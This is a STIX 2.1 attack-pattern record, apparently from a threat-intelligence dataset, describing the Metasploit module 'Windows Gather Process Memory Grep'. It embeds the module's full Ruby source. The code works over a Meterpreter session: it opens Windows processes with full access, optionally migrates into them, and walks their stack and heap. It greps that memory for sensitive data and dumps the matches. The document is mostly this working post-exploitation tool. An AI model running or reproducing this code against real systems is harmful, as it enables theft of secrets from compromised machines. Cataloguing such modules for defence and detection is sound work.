{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--971984e8-2c18-4e41-8984-4cf534510695",
    "created": "2024-08-14T16:33:05.052043Z",
    "modified": "2024-08-14T16:33:05.052046Z",
    "name": "Windows Gather Process Memory Grep",
    "description": " This module allows for searching the memory space of a process for potentially sensitive data.  Please note: When the HEAP option is enabled, the module will have to migrate to the process you are grepping, and will not migrate back automatically. This means that if the user terminates the application after using this module, you may lose your session.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/memory_grep.rb",
            "external_id": "memory_grep.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Process Memory Grep',\n        'Description' => %q{\n          This module allows for searching the memory space of a process for potentially\n          sensitive data.  Please note: When the HEAP option is enabled, the module will have\n          to migrate to the process you are grepping, and will not migrate back automatically.\n          This means that if the user terminates the application after using this module, you\n          may lose your session.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['bannedit'],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_migrate\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_getpid\n              stdapi_sys_process_memory_query\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_thread_open\n            ]\n          }\n        }\n      )\n    )\n    register_options([\n      OptString.new('PROCESS', [true, 'Name of the process to dump memory from', nil]),\n      OptRegexp.new('REGEX', [true, 'Regular expression to search for with in memory', nil]),\n      OptBool.new('HEAP', [false, 'Grep from heap', false])\n    ])\n  end\n\n  def get_data_from_stack(target_pid)\n    proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)\n    stack = []\n    begin\n      threads = proc.thread.each_thread do |tid|\n        thread = proc.thread.open(tid)\n        esp = thread.query_regs['esp']\n        addr = proc.memory.query(esp)\n        vprint_status(\"Found Thread TID: #{tid}\\tBaseAddress: 0x%08x\\t\\tRegionSize: %d bytes\" % [addr['BaseAddress'], addr['RegionSize']])\n        data = proc.memory.read(addr['BaseAddress'], addr['RegionSize'])\n        stack << {\n          'Address' => addr['BaseAddress'],\n          'Size' => addr['RegionSize'],\n          'Handle' => thread.handle,\n          'Data' => data\n        }\n      end\n    rescue StandardError\n    end\n\n    stack\n  end\n\n  def get_data_from_heap(target_pid)\n    # we need to be inside the process to walk the heap using railgun\n    heap = []\n    if target_pid != client.sys.process.getpid\n      print_status(\"Migrating into #{target_pid} to allow for dumping heap data\")\n      session.core.migrate(target_pid)\n    end\n    proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)\n\n    heap_cnt = session.railgun.kernel32.GetProcessHeaps(nil, nil)['return']\n    dheap = session.railgun.kernel32.GetProcessHeap()['return']\n    vprint_status('Default Process Heap: 0x%08x' % dheap)\n    ret = session.railgun.kernel32.GetProcessHeaps(heap_cnt, heap_cnt * 4)\n    pheaps = ret['ProcessHeaps']\n\n    idx = 0\n    handles = []\n    while idx != pheaps.length\n      vprint_status('Found Heap: 0x%08x' % pheaps[idx, 4].unpack('V')[0])\n      handles << pheaps[idx, 4].unpack('V')[0]\n      idx += 4\n    end\n\n    print_status('Walking the heap... this could take some time')\n    heap = []\n    handles.each do |handle|\n      lpentry = \"\\x00\" * 42\n      ret = ''\n      while (ret = session.railgun.kernel32.HeapWalk(handle, lpentry)) && ret['return']\n        entry = ret['lpEntry'][0, 4].unpack('V')[0]\n        pointer = proc.memory.read(entry, 512)\n        size = ret['lpEntry'][4, 4].unpack('V')[0]\n        data = proc.memory.read(entry, (size == 0) ? 1048576 : size)\n        if !data.empty?\n          heap << {\n            'Address' => entry,\n            'Size' => data.length,\n            'Handle' => handle,\n            'Data' => data\n          }\n        end\n        lpentry = ret['lpEntry']\n        break if (ret['GetLastError'] == 259) || (size == 0)\n      end\n    end\n\n    heap\n  end\n\n  def dump_data(target_pid)\n    regex = datastore['REGEX']\n\n    get_data_from_stack(target_pid).each do |mem|\n      idx = mem['Data'].index(regex)\n\n      next if idx.nil?\n\n      print_status('Match found on stack!')\n      print_line\n      data = mem['Data'][idx, 512]\n      addr = mem['Address'] + idx\n      print_line(Rex::Text.to_hex_dump(data, 16, addr))\n    end\n\n    # Grep from heap is optional.  If the 'HEAP' option isn't set,\n    # then let's bail.\n    return unless datastore['HEAP']\n\n    get_data_from_heap(target_pid).each do |mem|\n      idx = mem['Data'].index(regex)\n\n      next if idx.nil?\n\n      print_status('Match found on heap!')\n      print_line\n      data = mem['Data'][idx, 512]\n      addr = mem['Address'] + idx\n      print_line(Rex::Text.to_hex_dump(data, 16, addr))\n    end\n  end\n\n  def run\n    if session.type != 'meterpreter'\n      print_error 'Only meterpreter sessions are supported by this post module'\n      return\n    end\n\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n\n    proc_name = datastore['PROCESS']\n\n    # Collect PIDs\n    pids = []\n    client.sys.process.processes.each do |p|\n      pids << p['pid'] if p['name'] == proc_name\n    end\n\n    if pids.empty?\n      print_error(\"No PID found for #{proc_name}\")\n      return\n    end\n\n    print_status(\"PIDs found for #{proc_name}: #{pids * ', '}\")\n\n    pids.each do |pid|\n      print_status(\"Searching in process: #{pid}...\")\n      dump_data(pid)\n      print_line\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}